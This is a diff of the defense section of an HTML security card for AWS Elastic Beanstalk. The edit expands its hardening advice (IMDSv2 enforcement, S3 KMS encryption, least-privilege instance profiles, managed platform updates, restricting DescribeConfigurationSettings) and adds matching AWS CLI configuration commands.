+    Namespace=aws:elasticbeanstalk:application:environmentsecrets,OptionName=DB_PASSWORD,Value=arn:aws:secretsmanager:REGION:ACCOUNT_ID:secret:my-db-password</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F512;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Enforce IMDSv2 on All Instances</h4>
-              <p>Block SSRF-based credential theft by requiring IMDSv2 on all EC2 instances.</p>
-              <pre><code>aws elasticbeanstalk update-environment --environment-name ENV \
-  --option-settings Namespace=aws:autoscaling:launchconfiguration,OptionName=DisableIMDSv1,Value=true</code></pre>
+              <p>Configure the Elastic Beanstalk environment to require IMDSv2 on all EC2 instances, blocking SSRF-based credential theft.</p>
+              <pre><code>aws elasticbeanstalk update-environment \
+  --environment-name ENV_NAME \
+  --option-settings \
+    Namespace=aws:autoscaling:launchconfiguration,OptionName=DisableIMDSv1,Value=true</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F511;</span>
+            <span class="defense-icon"></span>
             <div>
-              <h4>Enable S3 Bucket Encryption</h4>
-              <p>Enable KMS encryption on the Elastic Beanstalk S3 bucket and restrict access to service role only.</p>
+              <h4>Enable S3 Bucket Encryption and Restrict Access</h4>
+              <p>Enable default encryption on the Elastic Beanstalk S3 bucket and restrict access to only the service role and deployment principals.</p>
+              <pre><code>aws s3api put-bucket-encryption \
+  --bucket elasticbeanstalk-REGION-ACCOUNT_ID \
+  --server-side-encryption-configuration \
+    '{&quot;Rules&quot;:[{&quot;ApplyServerSideEncryptionByDefault&quot;:{&quot;SSEAlgorithm&quot;:&quot;aws:kms&quot;}}]}'</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F464;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Use Least-Privilege Instance Profiles</h4>
-              <p>Create custom instance profile with only required permissions. Remove unused managed policies.</p>
+              <p>Do not attach the default managed policies blindly. Create a custom instance profile with only the permissions your application requires. Remove <code>AWSElasticBeanstalkWorkerTier</code> and <code>AWSElasticBeanstalkMulticontainerDocker</code> if you are running a standard web server environment.</p>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F504;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Enable Managed Platform Updates</h4>
-              <p>Keep OS, runtime, and web server patched automatically.</p>
+              <p>Keep the OS, runtime, and web server patched automatically by enabling managed platform updates.</p>
+              <pre><code>aws elasticbeanstalk update-environment \
+  --environment-name ENV_NAME \
+  --option-settings \
+    Namespace=aws:elasticbeanstalk:managedactions,OptionName=ManagedActionsEnabled,Value=true \
+    Namespace=aws:elasticbeanstalk:managedactions,OptionName=PreferredStartTime,Value=&quot;Sun:02:00&quot; \
+    Namespace=aws:elasticbeanstalk:managedactions:platformupdate,OptionName=UpdateLevel,Value=minor</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F6AB;</span>
+            <span class="defense-icon"></span>
             <div>
-              <h4>Restrict DescribeConfigurationSettings</h4>
-              <p>Explicitly deny DescribeConfigurationSettings for all principals except deployment pipelines.</p>
+              <h4>Restrict DescribeConfigurationSettings Access</h4>
+              <p>Explicitly deny <code>elasticbeanstalk:DescribeConfigurationSettings</code> for all principals except deployment pipelines and authorized operators. This API action exposes all environment variables in plaintext.</p>
             </div>
           </div>
         </div></div></div>
 
-<!-- Footer -->
 <div class="footer">
-  <p>AWS Elastic Beanstalk Security Security Card</p>
-  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+  <p><strong>AWS Elastic Beanstalk Security Card</strong></p>
+  <p>Always obtain proper authorization before testing</p>
 </div>
 
 </body>
